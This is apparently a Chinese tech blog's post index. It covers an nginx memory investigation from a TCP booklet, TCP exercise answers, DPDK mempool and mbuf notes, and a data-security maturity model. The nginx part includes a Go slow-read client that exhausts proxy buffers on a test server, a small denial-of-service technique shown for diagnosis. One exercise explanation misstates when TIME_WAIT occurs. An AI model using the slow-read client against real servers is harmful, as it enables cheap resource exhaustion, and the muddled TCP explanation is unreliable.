这里。\n为了验证想法，想办法 dump 一下 nginx 的内存看看。因为在后期内存占用较高的状况下，dump 内存很容易失败，这里在内存刚开始上涨没多久的时候开始 dump。\n首先使用 pmap 查看其中任意一个 worker 进程的内存分布，这里是 4199，使用 pmap 命令的输出如下所示。\n1 2 3 4  pmap -x 4199 | sort -k 3 -n -r  00007f2340539000 475240 461696 461696 rw--- [ anon ] ...   随后使用 cat /proc/4199/smaps | grep 7f2340539000 查找某一段内存的起始和结束地址，如下所示。\n1 2 3  cat /proc/3492/smaps | grep 7f2340539000  7f2340539000-7f235d553000 rw-p 00000000 00:00 0   随后使用 gdb 连上这个进程，dump 出这一段内存。\n1 2 3  gdb -pid 4199  dump memory memory.dump 0x7f2340539000 0x7f235d553000   随后使用 strings 命令查看这个 dump 文件的可读字符串内容，可以看到是大量的请求和响应内容。\n这样坚定了是因为缓存了大量的消息导致的内存上涨。随后看了一下 Nginx 的参数配置，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  location / {  proxy_pass http://xxx;  proxy_set_header X-Forwarded-Url \u0026#34;$scheme://$host$request_uri\u0026#34;;  proxy_redirect off;  proxy_http_version 1.1;  proxy_set_header Upgrade $http_upgrade;  proxy_set_header Connection \u0026#34;upgrade\u0026#34;;  proxy_set_header Cookie $http_cookie;  proxy_set_header Host $host;  proxy_set_header X-Forwarded-Proto $scheme;  proxy_set_header X-Real-IP $remote_addr;  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  client_max_body_size 512M;  client_body_buffer_size 64M;  proxy_connect_timeout 900;  proxy_send_timeout 900;  proxy_read_timeout 900;  proxy_buffer_size 64M;  proxy_buffers 64 16M;  proxy_busy_buffers_size 256M;  proxy_temp_file_write_size 512M; }   可以看到 proxy_buffers 这个值设置的特别大。接下来我们来模拟一下，upstream 上下游收发速度不一致对 Nginx 内存占用的影响。\n模拟 Nginx 内存上涨 我这里模拟的是缓慢收包的客户端，另外一边是一个资源充沛的后端服务端，然后观察 Nginx 的内存会不会有什么变化。\n缓慢收包客户端是用 golang 写的，用 TCP 模拟 HTTP 请求发送，代码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  package main  import ( \t\u0026#34;bufio\u0026#34; \t\u0026#34;fmt\u0026#34; \t\u0026#34;net\u0026#34; \t\u0026#34;time\u0026#34; )  func main() { \tconn, _ := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;10.211.55.10:80\u0026#34;) \ttext := \u0026#34;GET /demo.mp4 HTTP/1.1\\r\\nHost: ya.test.me\\r\\n\\r\\n\u0026#34;  \tfmt.Fprintf(conn, text) \tfor ; ; { \t_, _ = bufio.NewReader(conn).ReadByte() \ttime.Sleep(time.Second * 3) \tprintln(\u0026#34;read one byte\u0026#34;) \t} }   在测试 Nginx 上开启 pidstat 监控内存变化\n1  pidstat -p pid -r 1 1000   运行上面的 golang 代码，Nginx worker 进程的内存变化如下所示。\n04:12:13 是 golang 程序启动的时间，可以看到在很短的时间内，Nginx 的内存占用就涨到了 464136 kB（接近 450M)，且会维持很长一段时间。\n同时值得注意的是，proxy_buffers 的设置大小是针对单个连接而言的，如果有多个连接发过来，内存占用会继续增长。下面是同时运行两个 golang 进程对 Nginx 内存影响的结果。\n可以看到两个慢速客户端连接上来的时候，内存已经涨到了 900 多 M。\n解决方案 因为要支持上百万的连接，针对单个连接的资源配额要小心又小心。一个最快改动方式是把 proxy_buffering 设置为 off，如下所示。\n1  proxy_buffering off;   经过实测，在压测环境修改了这个值以后，以及调小了 proxy_buffer_size 的值以后，内存稳定在了 20G 左右，没有再飙升过，内存占用截图如下所示。\n后面可以开启 proxy_buffering，调整 proxy_buffers 的大小可以在内存消耗和性能方面取得更好的平衡。\n在测试环境重复刚才的测试，结果如下所示。\n可以看到这次内存值增长了 64M 左右。为什么是增长 64M 呢？来看看 proxy_buffering 的 Nginx 文档（nginx.org/en/docs/htt…\n When buffering is enabled, nginx receives a response from the proxied server as soon as possible, saving it into the buffers set by the proxy_buffer_size and proxy_buffers directives. If the whole response does not fit into memory, a part of it can be saved to a temporary file on the disk. Writing to temporary files is controlled by the proxy_max_temp_file_size and proxy_temp_file_write_size directives.\n  When buffering is disabled, the response is passed to a client synchronously, immediately as it is received. nginx will not try to read the whole response from the proxied server. The maximum size of the data that nginx can receive from the server at a time is set by the proxy_buffer_size directive.\n 可以看到，当 proxy_buffering 处于 on 状态时，Nginx 会尽可能多的将后端服务器返回的内容接收并存储到自己的缓冲区中，这个缓冲区的最大大小是 proxy_buffer_size * proxy_buffers 的内存。\n如果后端返回的消息很大，这些内存都放不下，会被放入到磁盘文件中。临时文件由 proxy_max_temp_file_size 和 proxy_temp_file_write_size 这两个指令决定的，这里不展开。\n当 proxy_buffering 处于 off 状态时，Nginx 不会尽可能的多的从代理 server 中读数据，而是一次最多读 proxy_buffer_size 大小的数据发送给客户端。\nNginx 的 buffering 机制设计的初衷确实是为了解决收发两端速度不一致问题的，没有 buffering 的情况下，数据会直接从后端服务转发到客户端，如果客户端的接收速度足够快，buffering 完全可以关掉。但是这个初衷在海量连接的情况下，资源的消耗需要同时考虑进来，如果有人故意伪造比较慢的客户端，可以使用很小的代价消耗服务器上很大的资源。\n其实这是一个非阻塞编程中的典型问题，接收数据不会阻塞发送数据，发送数据不会阻塞接收数据。如果 Nginx 的两端收发数据速度不对等，缓冲区设置得又过大，就会出问题了。\nNginx 源码分析 读取后端的响应写入本地缓冲区的源码在 src/event/ngx_event_pipe.c 中的 ngx_event_pipe_read_upstream 方法中。这个方法最终会调用 ngx_create_temp_buf 创建内存缓冲区。创建的次数和每次缓冲区的大小由 p-\u0026gt;bufs.num（缓冲区个数） 和 p-\u0026gt;bufs.size（每个缓冲区的大小）决定，这两个值就是我们在配置文件中指定的 proxy_buffers 的参数值。这部分源码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  static ngx_int_t ngx_event_pipe_read_upstream(ngx_event_pipe_t *p) {  for ( ;; ) {   if (p-\u0026gt;free_raw_bufs) {  // ...  } else if (p-\u0026gt;allocated \u0026lt; p-\u0026gt;bufs.num) { // p-\u0026gt;allocated 目前已分配的缓冲区个数，p-\u0026gt;bufs.num 缓冲区个数最大大小  /* allocate a new buf if it\u0026#39;s still allowed */  b = ngx_create_temp_buf(p-\u0026gt;pool, p-\u0026gt;bufs.size); // 创建大小为 p-\u0026gt;bufs.size 的缓冲区  if (b == NULL) {  return NGX_ABORT;  }  p-\u0026gt;allocated++;  }  } }   Nginx 源码调试的界面如下所示。\n后记 还有过程中一些辅助的判断方法，比如通过 strace、systemtap 工具跟踪内存的分配、释放过程，这里没有展开，这些工具是分析黑盒程序的神器。\n除此之外，在这次压测过程中还发现了 worker_connections 参数设置不合理导致 Nginx 启动完就占了 14G 内存等问题，这些问题在没有海量连接的情况下是比较难发现的。\n最后，底层原理是必备技能，调参是门艺术。上面说的内容可能都是错的，看看排查思路就好。\n39、作业题和思考题解析 这篇文章是前面习题的解析，题目来自各个大厂的笔试题和《TCP/IP》详解，还在不停的完善中，目前以有的如下：\n 收到 IP 数据包解析以后，它怎么知道这个分组应该投递到上层的哪一个协议（UDP 或 TCP）\n解析： IP 头里有一个“协议”字段，指出在上层使用的协议，比如值为 6 表示数据交给 TCP、值为 17 表示数据交给 UDP\n TCP 提供了一种字节流服务，而收发双方都不保持记录的边界，应用程序应该如何提供他们自己的记录标识呢？\n解析：应用程序使用自己约定的规则来表示消息的边界，比如有一些使用回车+换行（\u0026quot;\\r\\n\u0026quot;），比如 Redis 的通信协议（RESP protocol）\n A B 两个主机之间建立了一个 TCP 连接，A 主机发给 B 主机两个 TCP 报文，大小分别是 500 和 300，第一个报文的序列号是 200，那么 B 主机接收两个报文后，返回的确认号是（）\n A、200 B、700 C、800 D、1000  答案：D，500+300+200\n 客户端的使用 ISN=2000 打开一个连接，服务器端使用 ISN=3000 打开一个连接，经过 3 次握手建立连接。连接建立起来以后，假定客户端向服务器发送一段数据 Welcome the server!（长度 20 Bytes），而服务器的回答数据 Thank you!（长度 10 Bytes ），试画出三次握手和数据传输阶段报文段序列号、确认号的情况。\n答案：较简单，我先偷懒不画\n TCP/IP 协议中，MSS 和 MTU 分别工作在哪一层？\n参考：MSS-\u0026gt;传输层，MTU：链路层\n 在 MTU=1500 字节的以太网中，TCP 报文的最大载荷为多少字节？\n参考：1500（MTU） - 20（IP 头大小） - 20（TCP 头大小）= 1460\n 小于（）的 TCP/UDP 端口号已保留与现有服务一一对应，此数字以上的端口号可自由分配？\n A、80 B、1024 C、8080 D、65525  参考：B，保留端口号\n 下列 TCP 端口号中不属于熟知端口号的是（）\n A、21 B、23 C、80 D、3210  参考：D，小于 1024 的端口号是熟知端口号\n 关于网络端口号，以下哪个说法是正确的（）\n A、通过 netstat 命令，可以查看进程监听端口的情况 B、https 协议默认端口号是 8081 C、ssh 默认端口号是 80 D、一般认为，0-80 之间的端口号为周知端口号(Well Known Ports)  参考：A\n TCP 协议三次握手建立一个连接，第二次握手的时候服务器所处的状态是（）\n A、SYN_RECV B、ESTABLISHED C、SYN-SENT D、LAST_ACK  参考：A，收到了 SYN，发送 SYN+ACK 以后的状态，完整转换图见文章\n 下面关于三次握手与connect()函数的关系说法错误的是（）\n A、客户端发送 SYN 给服务器 B、服务器只发送 SYN 给客户端 C、客户端收到服务器回应后发送 ACK 给服务器 D、connect() 函数在三次握手的第二次返回  参考：B，服务端发送 SYN+ACK\n HTTP传输完成，断开进行四次挥手，第二次挥手的时候客户端所处的状态是：\n A、CLOSE_WAIT B、LAST_ACK C、FIN_WAIT2 D、TIME_WAIT  参考：C，详细的状态切换图看文章\n 正常的 TCP 三次握手和四次挥手过程（客户端建连、断连）中，以下状态分别处于服务端和客户端描述正确的是\n A、服务端：SYN-SEND，TIME-WAIT 客户端：SYN-RCVD，CLOSE-WAIT B、服务端：SYN-SEND，CLOSE-WAIT 客户端：SYN-RCVD，TIME-WAIT C、服务端：SYN-RCVD，CLOSE-WAIT 客户端：SYN-SEND，TIME-WAIT D、服务端：SYN-RCVD，TIME-WAIT 客户端：SYN-SEND，CLOSE-WAIT  参考：C，SYN-RCVD 出现在被动打开方服务端，排除A、B，TIME-WAIT 出现在主动断开方客户端，排除 D\n 下列TCP连接建立过程描述正确的是：\n A、服务端收到客户端的 SYN 包后等待 2*MSL 时间后就会进入 SYN_SENT 状态 B、服务端收到客户端的 ACK 包后会进入 SYN_RCVD 状态 C、当客户端处于 ESTABLISHED 状态时，服务端可能仍然处于 SYN_RCVD 状态 D、服务端未收到客户端确认包，等待 2*MSL 时间后会直接关闭连接  参考：C，建连与 2*ML 没有关系，排除 A、D，服务端在收到 SYN 包且发出去 SYN+ACK 以后 进入 SYN_RCVD 状态，排除 B。如果客户端给服务端的 ACK 丢失，客户端进入 ESTABLISHED 状态时，服务端仍然处于 SYN_RCVD 状态。\n TCP连接关闭，可能有经历哪几种状态：\n A、LISTEN B、TIME-WAIT C、LAST-ACK D、SYN-RECEIVED  参考：B、C 参考四次挥手的内容\n TCP 状态变迁中，存在 TIME_WAIT 状态，请问以下正确的描述是？\n A、TIME_WAIT 状态可以帮助 TCP 的全双工连接可靠释放 B、TIME_WAIT 状态是 TCP 是三次握手过程中的状态 C、TIME_WAIT 状态是为了保证重新生成的 socket 不受之前延迟报文的影响 D、TIME_WAIT 状态是为了让旧数据包消失在网络中  参考：B 明显错误，TIME_WAIT 不是挥手阶段的状态。A、C、D都正确\n 假设 MSL 是 60s，请问系统能够初始化一个新连接然后主动关闭的最大速率是多少？（忽略1~1024区间的端口）\n 参考：系统可用端口号的范围：65536 - 1024 = 64512，主动关闭方会保持 TIME_WAIT 时间 2*MSL = 120s，那最大的速率是：64512 / 120 = 537.6   设 TCP 的 ssthresh （慢开始门限）的初始值为 8 （单位为报文段）。当拥塞窗口上升到 12 时网络发生了超时，TCP 使用慢开始和拥塞避免。试分别求出第 1 次到第 15 次传输的各拥塞窗口大小。\n 参考：过程如下表所示。     次数 拥塞窗口 描述 备注     1 1 慢开始，指数增加    2 2 慢开始，指数增加    3 4 慢开始，指数增加    4 8 慢开始，指数增加    5 9 拥塞避免，线性增加    6 10 拥塞避免，线性增加    7 11 拥塞避免，线性增加    8 12 拥塞避免，线性增加 ssthresh 减半变为 6，拥塞窗口降为 1   9 1 慢开始    10 2 慢开始    11 4 慢开始    12 6 拥塞避免，线性增加    13 7 拥塞避免，线性增加    14 8 拥塞避免，线性增加    15 9 拥塞避免，线性增加     40、网络学习一路困难，与君共勉 不知不觉，业余时间写这本小册已经有几个月了，终于写得差不多了。写这本小册的过程还是很不容易的，收获的东西也远超我的想象。为了讲清楚细节，画了有上百张图。有时候为了找一个合理解释说服自己，英文的 RFC 看到快要吐。但是 TCP 的知识浩如烟海，虽然我已经尽力想把 TCP 写的通俗易懂、知识全面，但肯定会有很多的纰漏和考虑不周全的地方。\n为什么一定要写这本小册 工作的时间越长，越发觉得自己能对其他人产生的影响其实是微乎其微的，如果能有一些东西，能真正帮助到他人，那便是极好的。\nTCP 是我一直以来想分享的主题，因为这个在公司的各种技术分享上也讲过很多次，但是总觉得欠缺系统性，零零散散的东西对人帮助非常有限。我想写一个系列的东西应该可以帮我自己梳理清楚，看的同学也可学到更多的方法。我也想挑战一下自己，看自己能否在这一块技术上升一个层次。\n参考资料  《TCP/IP详解 卷1：协议》 这本神书可以说是 TCP 领域的权威之作，无论是初学者还是功底深厚的网络领域高手，本书都是案头必备。推荐第 1 版和第 2 版都看一下，第 1 版自 1994 年出版以来深受读者欢迎，但其内容有些已经陈旧。第 1 版每一章后面都有非常不错的习题，很可惜新版砍掉了这部分。 TCP/IP高效编程 —— 改善网络程序的44个技巧 这也是一本经典之作，对 TCP/IP 编程中的各种问题进行了详尽的分析，利用 44 个技巧探讨 TCP 编程中的各种问题，我在这本书中受益匪浅。 The TCP/IP Guide —— A Comprehensive, Illustrated Internet Protocols Reference 这本书是一个大部头有 1618 页，暂时还没有中文版。相比于《TCP/IP 详解》，这本书更适合学习入门，有大量详实的解释和绘制精美的图表，也是强烈推荐新手学习，反正我是看得停不下来。 UNIX网络编程第1卷:套接口API 如果想真正搞懂 TCP 协议或者网络编程，这本书不可或缺，基本上所有网络编程相关的内容都在这了，里面关于阻塞非阻塞、同步异步、套接字选项、IO 多路复用的东西看的非常过瘾。你看《欢乐颂》里，应勤就是经常看这本书，才能追到杨紫。 林沛满的 wireshark 系列 Wireshark网络分析就这么简单 这位大神写过好几本关于 wireshark 的书，本本都很经典。风格谐风趣，由浅入深地用 Wireshark 分析了常见的网络协议，基本上每篇文章都是干货，每次看都有新的收获。 packetdrill github 页面 packetdrill 的源码在这里下载，但是很可惜的是 packetdrill 文档特别少，网上也很难搜到相关的文章，主要是下面这几个  packetdrill USENIX ATC paper from June 2013 packetdrill USENIX Computer Networking : Principles, Protocols and Practice INJECTING TCP SEGMENTS    纸上得来终觉浅，绝知此事要躬行 要学好 TCP 不是看看文章懂点理论就好了，必须要动手搭环境、抓包分析，这样遇到问题的时候上手抓包分析心里才有底。\n我在写这本小册的过程中，也是尽量把每个理论都能用实验的方式来复现，让你有机会亲手来验证各种复杂的场景。只有动手抓包分析了，这些东西才会印象深刻，才会变成真正属于你自己的知识。\n首先你得有至少一台 Linux 机器，个人推荐用虚拟机安装 Linux 的方式，可以尽情的折腾。其次你得有耐得住寂寞，日新月异的新框架、新技术对我们搞技术的诱惑很大，生怕自己学慢了。但是只有掌握了底层的东西，才能真正理解新技术背后的原理和真相，才能体会到万变不离其宗的感觉。\n最后 感谢这么有耐心看到这里的读者，希望你能给我更多的意见。这本小册还远不够完美，但是希望能及时放出来，与大家一起交流才有意思。我还有几本小册正在酝酿中，下本小册见。\n欢迎关注我的公众号，虽然现在还没有什么内容。不过我会慢慢写一些偏原理一点的分布式理论、网络协议、编程语言相关的东西。\n","permalink":"https://kevinerr.github.io/posts/tech/tcp/","summary":"2、TCP/IP 历史与分层模型 目前 TCP/IP 协议可以说是名气最大、使用最广泛的计算机网络，从这篇文章来会讲解 TCP 协议的历史和分层模型。将分以下两个部分","title":"TCP"},{"content":"DPDK Mempool 库 内存池是一个具有固定大小的对象分配器。 在DPDK中，它由名称唯一标识，并且使用mempool handler来存储空闲对象。 默认的mempool handler是基于ring的。它提供了一些可选的服务，例如“per-core缓存”和“内存对齐”，内存对齐能确保对象被填充，以在所有DRAM或DDR3通道上均匀分布。\n这个库由 Mbuf Library 使用。\n2.1 Cookies保护字段 在调试模式中(CONFIG_RTE_LIBRTE_MEMPOOL_DEBUG is enabled)，将在块的开头和结尾处添加cookies。 分配的对象包含保护字段，以帮助调试缓冲区溢出。\n2.2 Stats统计信息 在调试模式中(CONFIG_RTE_LIBRTE_MEMPOOL_DEBUG is enabled)，从池中获取、释放的统计信息存放在mempool结构体中。 为了避免并发访问统计计数器，统计信息是per-lcore的。\n2.3 内存对齐约束 根据X86架构上的硬件内存配置，可以通过在对象之间添加特定的填充来极大地提高性能。目的是确保每个对象的起始位置被均匀的分布在不同的channel和rank上，以便实现所有通道的负载均衡。\n当执行L3转发或流分类时，对于包缓冲区尤其如此。只访问前64个字节，因此可以通过将对象的开始地址分布在不同的通道中来提高性能。\nDIMM上的rank数目是可访问DIMM完整数据位宽的独立DIMM集合的数量。 由于他们共享相同的路径，因此rank不能被同时访问。 DIMM上的DRAM芯片的物理布局不一定与rank数目相关。\n当运行app时，EAL命令行选项提供了添加内存通道和rank数目的能力。\n注：命令行必须始终指定处理器的内存通道数目。\n不同DIMM架构的对齐示例如下两张图所示 。在例子中，我们假设包是16个64字节的块（在实际应用中这是不正确的）。\n例1：Two Channels and Quad-ranked DIMM Example\n例2：Three Channels and Two Dual-ranked DIMM Example\nIntel® 5520芯片组有三个通道，因此，在大多数情况下，对象之间不需要填充。(除了大小为n x 3 x 64B的块)\n当创建一个新池时，用户可以指定使用此功能。\n 我的疑问：\n这里的例子是从dpdk官网拷贝过来的，我有个疑问，如果有谁知道麻烦给我留言。\n例2中的pkt0根据图上看明明是starts at channel 0， rank0，为什么图上标注的是rank1？如果从图上看，这里只保证了起始于不同channel，但仍是同一个rank而且是同一个DIMM。根据原文描述，pkt只要不是n x 3 x 64B的大小就不需要填充，感觉只是保证起始在不同channel就可以了。这个问题搜索了很久没有满意的答案。\n 2.4 本地缓存 在CPU使用率方面，由于每个访问需要compare-and-set (CAS)操作，所以多核访问内存池的空闲缓冲区成本比较高。 为了避免对内存池ring的访问请求太多，内存池分配器可以维护per-core cache，并通过实际内存池中具有较少锁定的缓存对内存池ring执行批量请求。 通过这种方式，每个core都可以访问自己空闲对象的缓存（带锁）， 只有当缓存填充时，内核才需要将某些空闲对象重新放回到缓冲池ring，或者当缓存空时，从缓冲池中获取更多对象。\n虽然这意味着一些buffer可能在某些core的缓存上处于空闲状态，但是core可以无锁访问其自己的缓存提供了性能上的提升。\n缓存由一个小型的per-core表及其长度组成。可以在创建池时启用/禁用此缓存。\n缓存大小的最大值是静态配置，并在编译时定义的(CONFIG_RTE_MEMPOOL_CACHE_MAX_SIZE)。\n不同于per-lcore内部缓存，应用程序可以通过接口 rte_mempool_cache_create() ， rte_mempool_cache_free() 和 rte_mempool_cache_flush() 创建和管理外部缓存。 这些用户拥有的缓存可以被显式传递给 rte_mempool_generic_put() 和 rte_mempool_generic_get() 。 接口 rte_mempool_default_cache() 返回默认内部缓存。 与默认缓存相反，用户拥有的高速缓存可以由非EAL线程使用。\n2.5 Mempool handlers 这允许外部存储子系统，如外部硬件存储管理系统和软件存储管理与DPDK一起使用。\nmempool handler包括两方面：\n 添加新的mempool操作代码。这是通过添加mempool ops代码，并使用 MEMPOOL_REGISTER_OPS 宏来实现的。 使用新的API调用 rte_mempool_create_empty() 及 rte_mempool_set_ops_byname() 用于创建新的mempool，并制定用户要使用的操作。  在同一个应用程序中可能会使用几个不同的mempool处理。 可以使用 rte_mempool_create_empty() 创建一个新的mempool，然后用 rte_mempool_set_ops_byname() 将mempool指向相关的 mempool处理回调（ops）结构体。\n传统的应用程序可能会继续使用旧的 rte_mempool_create() API调用，它默认使用基于ring的mempool处理。 这些应用程序需要修改为新的mempool处理。\n对于使用 rte_pktmbuf_create() 的应用程序，有一个配置设置(RTE_MBUF_DEFAULT_MEMPOOL_OPS)，允许应用程序使用另一个mempool处理。\n2.6 用例 需要高性能的所有分配器应该使用内存池实现。 以下是一些使用实例：\n Mbuf Library Environment Abstraction Layer 任何需要在程序中分配固定大小对象，并将被系统持续使用的应用程序  http://doc.dpdk.org/guides/prog_guide/mempool_lib.html\nhttps://www.cnblogs.com/realjimmy/p/12903372.html\n","permalink":"https://kevinerr.github.io/posts/tech/mempool/","summary":"DPDK Mempool 库 内存池是一个具有固定大小的对象分配器。 在DPDK中，它由名称唯一标识，并且使用mempool handler来存储空闲对象。 默认的mem","title":"Mempool"},{"content":"Mbuf Library mbuf 库提供分配和释放缓冲区 (mbuf) 的能力，DPDK 应用程序可以使用这些缓冲区来存储消息缓冲区。消息缓冲区使用内存池库存储在内存池中。\nrte_mbuf 结构通常承载网络数据包缓冲区，但它实际上可以是任何数据（控制数据、事件……）。 rte_mbuf 头结构保持尽可能小，目前仅使用两个缓存行，最常用的字段位于两个缓存行中的第一个。\nDesign of Packet Buffers 对网络帧的封装及处理有两种方式：将网络帧元数据（metadata）和帧本身存放在固定大小的同一段缓存中；或将元数据和网络帧分开存放在两段缓存里。前者的好处是高效：对缓存的申请及释放均只需要一个指令，缺点是因为缓存长度固定而网络帧大小不一，大部分帧只能使用填0（padding）的方式填满整个缓存，较为耗费内存空间。后者的优点则是相对自由：帧数据的大小可以任意，同时对元数据和网络帧的缓存可以分开申请及释放；缺点是低效，因为无法保证数据存在于一个CacheLine中，可能造成HitMiss。\n为保持包处理的效率，DPDK采用了前者。网络帧元数据的一部分内容由DPDK的网卡驱动写入。这些内容包括VLAN标签、RSS哈希值、网络帧入口端口号以及巨型帧所占的Mbuf个数等。对于巨型帧，网络帧元数据仅出现在第一个帧的Mbuf结构中，其他的帧该信息为空。\n下图为单个mbuf的结构定义：\n一个Mbuf的基本组成。其中，Mbuf头部的大小为两个CacheLine，之后的部分为缓存内容，其起始地址存储在Mbuf结构的 buffer_addr指针中。在Mbuf头部和实际包数据之间有一段控制头空间（headroom），用来存储和系统中其他实体交互的信息，如控制信息、帧内容、事件等。headroom的长度可由RTE_PKTMBUF_HEADROOM定义。 headroom的起始地址保存在Mbuf的buff_addr指针中，在lib/librte_port/rte_port.h中也有实用的宏，用来获得从buff_addr起始特定偏移量的指针和数据，详情请参考rte_port.h源码中RTE_MBUF_METADATA_UINT8_PTR以及RTE_MBUF_METADATA_UINT8等宏。数据帧的起始指针可通过调用rte_pktmbuf_mtod（Mbuf）获得。 数据帧的实际长度可通过调用rte_pktmbuf_pktlen（Mbuf）或rte_pktmbuf_datalen（Mbuf）获得，但这仅限于单帧Mbuf。巨型帧的单帧长度只由rte_pktmbuf_datalen（Mbuf）返回，而rte_pktmbuf_pktlen（Mbuf）用于访问巨型帧所有帧长度的总和。 下图为多个mbuf的分段保存\n创建的函数为rte_pktmbuf_alloc（）或rte_ctrlmbuf_alloc（），前者用来创建网络帧Mbuf，后者用来创建控制 信息Mbuf。初始化该Mbuf则由rte_pktmbuf_init（）或rte_ctrlmbuf_init（）函数完成。这两个函数用来初始化一些Mbuf的关键 信息，如Mbuf类型、所属内存池、缓存起始地址等。初始化函数被作为rte_mempool_create的回调函数。 释放一段Mbuf实际等于将其放回所属的内存池，其缓存内容在被重新创建前不会被初始化。\n存储在内存池中的缓冲区 缓冲区管理器使用内存池库来分配缓冲区。因此，它确保数据包标头在通道和等级之间以最佳方式交织以进行 L3 处理。 mbuf 包含一个字段，指示它来自的池。当调用 rte_pktmbuf_free(m) 时，mbuf 返回到它的原始池。\n构造函数 数据包 mbuf 构造函数由 API 提供。 rte_pktmbuf_init()函数初始化mbuf结构中的一些字段，一旦创建就不会被用户修改（mbuf类型、源池、缓冲区起始地址等）。此函数在创建池时作为 rte_mempool_create() 函数的回调函数提供。\n分配和释放 mbuf 分配新的 mbuf 需要用户指定应该从中获取 mbuf 的内存池。对于任何新分配的 mbuf，它都包含一个长度为 0 的段。数据的偏移量被初始化为在缓冲区中有一些字节的空间（RTE_PKTMBUF_HEADROOM）。\n释放 mbuf 意味着将其返回到原来的内存池中。 mbuf 的内容在存储在池中时不会被修改（作为免费 mbuf）。由构造函数初始化的字段不需要在 mbuf 分配时重新初始化。\n当释放包含多个段的数据包 mbuf 时，所有段都被释放并返回到它们原来的内存池。\n操作 mbuf 该库提供了一些用于操作数据包 mbuf 中的数据的函数。例如：\n获得帧数据长度——rte_pktmbuf_datalen（） 获得指向数据的指针——rte_pktmbuf_mtod（） 在帧数据前插入一段内容——rte_pktmbuf_prepend（） 在帧数据后增加一段内容——rte_pktmbuf_append（） 在帧数据前删除一段内容——rte_pktmbuf_adj（） 将帧数据后截掉一段内容——rte_pktmbuf_trim（） 连接两段缓存——rte_pktmbuf_attach（） 此函数会连接两段属于不同缓存区的缓存，称为间接缓存（indirectbuffer）。对间接缓存的访问效率低于直接缓存（意为一段缓存包含完整Mbuf结构和帧数据），因此请仅将此函数用于网络帧的复制或分段。 分开两段缓存——rte_pktmbuf_detach（） 克隆Mbuf——rte_pktmbuf_clone（），此函数作为rte_pktmbuf_attach的更高一级抽象，将正确设置连接后Mbuf的各个参数，相对rte_pktmbuf_attach更为安全。\n直接和间接缓冲区 直接缓冲区是完全独立且自包含的缓冲区。间接缓冲区的行为类似于直接缓冲区，但其中的缓冲区指针和数据偏移量指的是另一个直接缓冲区中的数据。这在需要复制或分段数据包的情况下很有用，因为间接缓冲区提供了跨多个缓冲区重用相同数据包数据的方法。\n当使用 rte_pktmbuf_attach() 函数“附加”到直接缓冲区时，缓冲区将变为间接缓冲区。每个缓冲区都有一个引用计数器字段，每当间接缓冲区附加到直接缓冲区时，直接缓冲区上的引用计数器就会递增。类似地，每当间接缓冲区被分离时，直接缓冲区上的引用计数器就会递减。如果结果引用计数器等于 0，则释放直接缓冲区，因为它不再使用。\n处理间接缓冲区时需要记住几件事。首先，一个间接缓冲区永远不会附加到另一个间接缓冲区。尝试将缓冲区 A 附加到 的间接缓冲区 B，B又附件在C上时，使 rte_pktmbuf_attach() 自动将 A 附加到 C，有效地克隆 B。其次，对于成为间接缓冲区，其引用计数器必须等于 1，即它不能被另一个间接缓冲区引用。最后，不可能将间接缓冲区重新附加到直接缓冲区（除非先将其分离）。\n虽然可以使用推荐的 rte_pktmbuf_attach() 和 rte_pktmbuf_detach() 函数直接调用附加/分离操作，但建议使用更高级别的 rte_pktmbuf_clone() 函数，该函数负责正确初始化间接缓冲区并可以克隆具有多个段的缓冲区。\n由于间接缓冲区不应该实际保存任何数据，因此应配置间接缓冲区的内存池以指示减少的内存消耗。间接缓冲区的内存池初始化示例（以及间接缓冲区的用例示例）可以在几个示例应用程序中找到，例如 IPv4 多播示例应用程序。\n调试 在调试模式下，mbuf 库的函数在任何操作（例如缓冲区损坏、错误类型等）之前执行完整性检查。\n用例 所有网络应用程序都应该使用 mbufs 来传输网络数据包。\nhttp://doc.dpdk.org/guides/prog_guide/mbuf_lib.html\nhttps://blog.csdn.net/yaochuh/article/details/88207553\n","permalink":"https://kevinerr.github.io/posts/tech/mbuf/","summary":"Mbuf Library mbuf 库提供分配和释放缓冲区 (mbuf) 的能力，DPDK 应用程序可以使用这些缓冲区来存储消息缓冲区。消息缓冲区使用内存池库存储在内存池中。 rte_mbuf 结构通常承","title":"Mbuf"},{"content":"DSMM:数据安全能力成熟度模型(Data Security Capability Maturity Model) 规定了数据采集安全、数据传输安全、数据存 储安全、数据处理安全、数据交换安全、数据销毁安全、通用安全的成熟度等级要求。\nBP:基本实践(Base Practice)\nDSMM:数据安全能力成熟度模型(DataSecurityCapabilityMaturityModel)\nGP:通用实践(GenericPractice)\nPA:过程域(ProcessArea)\nSSL:安全套接层(SecureSocketsLayer)\nTLS:传输层安全(TransportLayerSecurity)\n数据生存周期 分为以下6个阶段:\na) 数据采集:组织内部系统中新产生数据,以及从外部系统收集数据的阶段;\nb) 数据传输:数据从一个实体传输到另一个实体的阶段;\nc) 数据存储:数据以任何数字格式进行存储的阶段;\nd) 数据处理:组织在内部对数据进行计算、分析、可视化等操作的阶段;\ne) 数据交换:组织与组织或个人进行数据交换的阶段;\nf) 数据销毁:对数据及数据存储媒体通过相应的操作手段,使数据彻底删除且无法通过任何手段 恢复的过程。\na) 数据采集安全的 PA(PA01~PA04)包括:数据分类分级、数据采集安全管理、数据源鉴别及记 录、数据质量管理4个 PA;\nb) 数据传输安全的 PA(PA05~PA06)包括:数据传输加密、网络可用性管理2个 PA;\nc) 数据存储安全的 PA(PA07~PA09)包括:存储媒体安全、逻辑存储安全、数据备份和恢复3个 安全 PA;\nd) 数据处理安全的 PA(PA10~PA14)包括:数据脱敏、数据分析安全、数据正当使用、数据处理 环境安全、数据导入导出安全5个安全 PA;\ne) 数据交换安全的 PA(PA15~PA17)包括:数据共享安全、数据发布安全、数据接口安全3个安 全 PA;\nf) 数据销毁安全的 PA(PA18~PA19)包括:数据销毁处置、存储媒体销毁处置2个安全 PA。\n数据采集安全 PA01 数据分类分级 https://cloud.tencent.com/developer/article/1692430\n基于法律法规以及业务需求确定组织内部的数据分类分级方法,对生成或收集的数据进行分类分 级标识。\n将组织数据划分为三类：\n 用户数据类 业务数据类 公司数据类\n 《信息安全技术 个人信息安全规范》GB/T 35273—2020中如下清单：\n将组织数据分为五个级别：\n 绝密（G1）这是极度敏感的信息，如果受到破坏或泄漏，可能会使组织面临严重财务或法律风险，例如财务信息、系统或个人认证信息等。 